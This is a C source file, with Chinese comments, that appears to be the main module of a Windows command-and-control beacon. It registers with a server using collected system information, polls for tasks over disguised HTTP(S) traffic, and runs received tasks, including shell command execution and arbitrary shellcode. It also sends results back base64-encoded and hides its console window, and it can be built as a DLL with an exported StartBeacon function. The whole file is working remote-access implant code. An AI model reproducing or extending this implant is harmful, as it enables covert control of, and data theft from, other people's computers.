#include "beacon.h"

// 全局变量定义
BEACON_CONFIG g_config = { 0 };
volatile BOOL g_beacon_running = FALSE;
char processPath[MAX_PATH * 2] = { 0 };

// 初始化全局变量
BEACON_ERROR init_globals(void) {
    memset(&g_config, 0, sizeof(BEACON_CONFIG));
    g_config.sleep_time = INITIAL_SLEEP_TIME;
    g_beacon_running = FALSE;
    return BEACON_SUCCESS;
}

// 清理全局变量
void cleanup_globals(void) {
    g_beacon_running = FALSE;
}

// 初始化函数
BEACON_ERROR beacon_init(BEACON_CONFIG* config) {
    if (!config) {
        return BEACON_ERROR_PARAMS;
    }

    // 获取系统UUID
    BEACON_ERROR error = get_system_uuid(config->uuid);
    if (error != BEACON_SUCCESS) {
        return error;
    }

    // 初始化HTTP
    error = http_init();
    if (error != BEACON_SUCCESS) {
        return error;
    }

    // 设置初始配置
    config->sleep_time = INITIAL_SLEEP_TIME;

    // 复制配置到全局变量
    memcpy(&g_config, config, sizeof(BEACON_CONFIG));

    return BEACON_SUCCESS;
}

// 注册Beacon
static BEACON_ERROR register_beacon(BEACON_CONFIG* config) {
    if (!config) {
        return BEACON_ERROR_PARAMS;
    }

    char* json_data = NULL;
    char* response = NULL;
    DWORD response_len = 0;
    BEACON_ERROR error = BEACON_SUCCESS;

    // 收集系统信息
    error = collect_system_info(&json_data);
    if (error != BEACON_SUCCESS) {
        return error;
    }

    // 发送注册请求
    HTTP_REQUEST request = {
        .method = L"POST",
        .path = REGISTER_ENDPOINT,
        .data = json_data,
        .data_len = strlen(json_data),
        .timeout = 30000,
        .use_ssl = USE_HTTPS
    };

    error = http_send_request(&request, &response, &response_len);
    if (error == BEACON_SUCCESS && response && response_len > 0) {
        // 解析响应中的client_id
        char* client_id_start = strstr(response, "clientId=");
        if (client_id_start && strlen(client_id_start) >= 45) { // "clientId=" + 36 UUID chars
            client_id_start += 9; // Skip "clientId="
            MultiByteToWideChar(CP_UTF8, 0, client_id_start, 36, config->client_id, UUID_LENGTH);
            swprintf_s(config->api_path, MAX_PATH_LENGTH, L"%ws?clientId=%ws", API_ENDPOINT, config->client_id);
        } else {
            error = BEACON_ERROR_NETWORK;
        }
    }

    // 清理
    if (json_data) free(json_data);
    if (response) free(response);

    return error;
}

// 主运行循环
BEACON_ERROR beacon_run(BEACON_CONFIG* config) {
    if (!config) {
        return BEACON_ERROR_PARAMS;
    }

    // 设置运行标志
    g_beacon_running = TRUE;

    // 注册beacon
    BEACON_ERROR error = register_beacon(config);
    if (error != BEACON_SUCCESS) {
        g_beacon_running = FALSE;
        return error;
    }

    // 主循环
    while (g_beacon_running) {
        char* response = NULL;
        DWORD response_len = 0;
        char* task_result = NULL;
        char* encoded_result = NULL;

        // 获取任务
        HTTP_REQUEST request = {
            .method = L"GET",
            .path = config->api_path,
            .data = NULL,
            .timeout = 30000,
            .use_ssl = USE_HTTPS
        };

        // 获取任务
        error = http_send_request(&request, &response, &response_len);
        
        // 检查是否收到服务器关闭信号
        if (error == BEACON_ERROR_SERVER_SHUTDOWN) {
            if (response) free(response);
            break;  // 退出循环
        }
        
        if (error == BEACON_SUCCESS && response && response_len > 0) {
            // 移除流量伪装包装
            char* unwrapped_response = unwrap_data_from_disguise(response);
            TASK_TYPE task_type = TASK_NULL;

            if (unwrapped_response) {
                size_t unwrapped_len = strlen(unwrapped_response);
                // 检查任务类型
                task_type = (unwrapped_len > 0) ? (TASK_TYPE)unwrapped_response[0] : TASK_NULL;
                // 执行任务
                error = execute_task(unwrapped_response, unwrapped_len, config);
                free(unwrapped_response);
            } else {
                // 如果解包失败，使用原始响应
                task_type = (response_len > 0) ? (TASK_TYPE)response[0] : TASK_NULL;
                error = execute_task(response, response_len, config);
            }
            if (error != BEACON_SUCCESS) {
                // 生成错误结果
                task_result = (char*)malloc(256);
                if (task_result) {
                    snprintf(task_result, 256, "Task execution failed with error: %d", error);
                }
            } else {
                // 对于进程列表和命令执行任务，不发送额外的成功消息，因为任务本身已经发送了数据
                if (task_type != TASK_PROCLIST && task_type != TASK_EXECUTE) {
                    // 生成成功结果
                    task_result = (char*)malloc(256);
                    if (task_result) {
                        snprintf(task_result, 256, "Task executed successfully");
                    }
                }
            }

            // 在心跳请求中包含任务结果
            if (task_result) {
                // Base64编码任务结果
                base64_encode((const unsigned char*)task_result, strlen(task_result), &encoded_result);
                if (encoded_result) {
                    // 将结果添加到心跳请求中
                    HTTP_REQUEST heartbeat_request = {
                        .method = L"POST",
                        .path = config->api_path,
                        .data = encoded_result,
                        .data_len = strlen(encoded_result),
                        .timeout = 30000,
                        .use_ssl = USE_HTTPS
                    };

                    char* heartbeat_response = NULL;
                    DWORD heartbeat_response_len = 0;
                    error = http_send_request(&heartbeat_request, &heartbeat_response, &heartbeat_response_len);
                    
                    // 检查心跳响应中的服务器关闭信号
                    if (error == BEACON_ERROR_SERVER_SHUTDOWN) {
                        if (heartbeat_response) free(heartbeat_response);
                        if (encoded_result) free(encoded_result);
                        if (task_result) free(task_result);
                        if (response) free(response);
                        break;  // 退出循环
                    }

                    if (heartbeat_response) {
                        free(heartbeat_response);
                    }
                    free(encoded_result);
                }
                free(task_result);
            }
        }

        // 释放响应数据
        if (response) {
            free(response);
        }

        // Sleep（检查运行状态）
        for (DWORD i = 0; i < config->sleep_time && g_beacon_running; i++) {
            Sleep(1000);
        }
    }

    g_beacon_running = FALSE;
    return BEACON_SUCCESS;
}

// 清理函数
void beacon_cleanup(BEACON_CONFIG* config) {
    g_beacon_running = FALSE;
    http_cleanup();
}

// 任务执行函数
BEACON_ERROR execute_task(const char* task_data, size_t data_len, BEACON_CONFIG* config) {
    if (!task_data || !config || data_len == 0) {
        return BEACON_ERROR_PARAMS;
    }

    TASK_TYPE task_type = (TASK_TYPE)task_data[0];
    const char* task_payload = task_data + 1;
    size_t payload_len = data_len - 1;  // 减去类型字节

    switch (task_type) {
        case TASK_SLEEP:
            return handle_sleep_task(task_payload, config);
        
        case TASK_PROCLIST:
            return handle_proclist_task(task_payload, config);
        
        case TASK_SHELLCODE:
            return handle_shellcode_task(task_payload, payload_len, config);

        case TASK_EXECUTE:
            return handle_execute_task(task_payload, config);

        case TASK_NULL:
            return BEACON_SUCCESS;
        
        default:
            return BEACON_ERROR_PARAMS;
    }
}

#ifdef BUILD_DLL
// DLL入口点
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // 初始化全局变量
            init_globals();
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            // 清理
            cleanup_globals();
            break;
    }
    return TRUE;
}

// 导出函数：启动Beacon
BEACON_API DWORD WINAPI StartBeacon(LPVOID lpParam) {
    BEACON_CONFIG config = {0};
    
    // 初始化Beacon
    BEACON_ERROR error = beacon_init(&config);
    if (error != BEACON_SUCCESS) {
        return error;
    }

    // 运行Beacon
    error = beacon_run(&config);
    
    // 清理
    beacon_cleanup(&config);
    
    return error;
}

// 导出函数：停止Beacon
BEACON_API BOOL WINAPI StopBeacon(void) {
    g_beacon_running = FALSE;
    return TRUE;
}

#else
// EXE入口点
int main(void) {
    // 隐藏控制台窗口
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 初始化全局变量
    init_globals();

    // 初始化配置
    BEACON_CONFIG config = {0};
    
    // 初始化Beacon
    BEACON_ERROR error = beacon_init(&config);
    if (error != BEACON_SUCCESS) {
        cleanup_globals();
        return 1;
    }

    // 运行Beacon
    error = beacon_run(&config);
    
    // 清理
    beacon_cleanup(&config);
    cleanup_globals();
    
    return (error == BEACON_SUCCESS) ? 0 : 1;
}
#endif 